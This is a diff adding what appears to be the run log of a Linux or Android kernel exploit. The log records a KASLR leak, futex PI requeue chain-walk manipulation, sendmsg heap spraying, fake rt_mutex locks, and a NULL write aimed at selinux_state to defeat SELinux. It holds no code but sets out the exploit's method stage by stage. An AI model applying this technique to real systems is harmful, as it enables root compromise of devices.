@@ -1,0 +1,22 @@
+[main] g_iov_idx=0 (override with IOV_IDX=k)  spray=sendmsg
+[kaslr] perf text-base=ffffffe474600000 min_kip=ffffffe4746a20a0 samples=29
+[kaslr] base=0xffffffe474600000 slide=0x246c600000
+  init_task   = 0xffffffe47f243640
+  selinux_state = 0xffffffe47f3a9d78 (enforcing @ +0)
+  fake_lock   = 0xffffffe47f3ca880 (uid_lock+0x200, ZEROED BSS rt_mutex)
+  fake_lock2  = 0xffffffe47f3ca980 (uid_lock+0x300, ZEROED BSS rt_mutex)
+[Y] tid=10792
+[X] tid=10793
+[main] topology ready; FUTEX_CMP_REQUEUE_PI(cond) -> cycle
+[main] CMP_REQUEUE_PI returned -35 (Resource deadlock would occur)
+[main] -EDEADLK: full chainwalk caught PI cycle
+[Y] PHASE1 spray: settle ghost (d=0 method=sendmsg: li=3 parent@iov0..2)
+[Y] SPRAY-DEBUG iovstack base=0x274060  &iov[4]=0x2740a0  method=sendmsg
+[Z] tid=10806
+[Z] FUTEX_LOCK_PI(L2): walk into pi_blocked_on
+[do_2] Z blocked on L2 — chain walk survived
+[phase1] sched_setscheduler(Y) -> rb_erase NULL write to root (settle)
+[phase1] chain walk OK (kernel alive)
+[phase2] request re-spray (parent=selinux-8, lock=fake_lock2 @ uid_lock+0x300)
+[Y] PHASE2 spray: d=0 li=3 parent=selinux-8 children=0 lock=fake_lock2
+[phase2] sched_setscheduler(Y) -> rb_erase NULL write to selinux
